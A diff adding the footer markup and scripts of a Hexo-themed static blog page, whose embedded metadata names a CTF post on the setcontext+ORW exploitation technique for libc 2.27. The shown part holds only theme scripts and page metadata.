+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/HFTTC.github.io/js/script.js"></script>
+
+
+  
+<script src="/HFTTC.github.io/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/HFTTC.github.io/js/pjax_script.js" data-pjax></script>
+
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "SEZUVEM=",
+          title: "SetContentORWlibc-2.27",
+          url: "https://idcm-svg.github.io/HFTTC.github.io/2026/04/28/PWN/PWNCTF/SetContentORWlibc-2.27/",
+          excerpt: "",
+          description: "",
+          stripContent: "SetContent ORW libc-2.27参考资料：https://www.cnblogs.com/pwnfeifei/p/15819825.html setcontext+orw 大致可以把2.27，2.29做为两个分界点。我们先来讨论 2.27 及以下的 setcontext + orw 的写法。 在学习过 SROP 之后我们知道 pwntools 自带了一款可以控制寄存器值的工具 123456frame = SigreturnFrame()frame.rsp = xxxframe.r",
+          date: "Tue Apr 28 2026 18:25:56 GMT+0800",
+          updated: "Tue Apr 28 2026 19:19:30 GMT+0800",
+          cover: "/HFTTC.github.io/images/banner.webp",
+        };
+      </script>
+        
+<script src="/HFTTC.github.io/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/HFTTC.github.io/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
